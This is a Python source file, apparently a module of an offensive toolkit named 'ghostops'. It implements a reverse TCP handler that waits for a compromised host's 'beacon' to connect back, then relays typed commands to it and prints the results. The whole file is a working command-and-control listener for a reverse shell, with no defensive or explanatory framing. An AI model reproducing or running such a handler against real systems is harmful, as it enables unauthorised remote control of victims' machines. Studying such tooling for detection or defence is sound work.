import socket
from colorama import Fore, Style
from ghostops.core.module_base import BaseModule
from ghostops.core.utils import Logger


class ReverseTcpHandler(BaseModule):
    module_name = "ReverseTcpHandler"
    module_description = "Listens for incoming reverse TCP connection and allows interaction with beacon."
    module_author = "Awagat Dhungana <4w4647@gmail.com>"
    module_category = "handler"
    module_target_os = ["generic"]
    module_target_architecture = ["generic"]

    @staticmethod
    def add_arguments(parser):
        parser.add_argument(
            "--host",
            required=True,
            help="IP address to listen on for incoming connections",
        )
        parser.add_argument(
            "--port",
            required=True,
            type=int,
            help="Port to listen on for incoming connections",
        )

    @staticmethod
    def main(args):
        host = args.host
        port = args.port

        Logger.log("info", f"Listening on {host}:{port}...")
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener:
            listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            listener.bind((host, port))
            listener.listen(1)

            conn, addr = listener.accept()
            with conn:
                Logger.log("good", f"Connection established from {addr[0]}:{addr[1]}")

                # Set 3-second timeout on the connection socket
                conn.settimeout(3)

                try:
                    while True:
                        command = input(f"[{Fore.RED}BEACON{Style.RESET_ALL}] {Style.BRIGHT}{addr[0]}:{addr[1]} -{Style.RESET_ALL} ").strip()
                        if not command:
                            continue
                        if command.lower() in ("exit", "quit"):
                            Logger.log("info", "Closing connection as requested.")
                            break

                        # Send command with newline terminator
                        conn.sendall((command + "\n").encode())

                        response = b""
                        while True:
                            try:
                                chunk = conn.recv(4096)
                                if not chunk:
                                    Logger.log("warn", "Connection closed by client.")
                                    return
                                response += chunk
                                # If the last chunk is smaller than 4096, assume end of output
                                if len(chunk) < 4096:
                                    break
                            except socket.timeout:
                                # Timeout reached; assume output complete
                                break

                        output = response.decode(errors="ignore").rstrip("\r\n")
                        print(output)

                except Exception as e:
                    Logger.log("flaw", f"Handler error: {e}")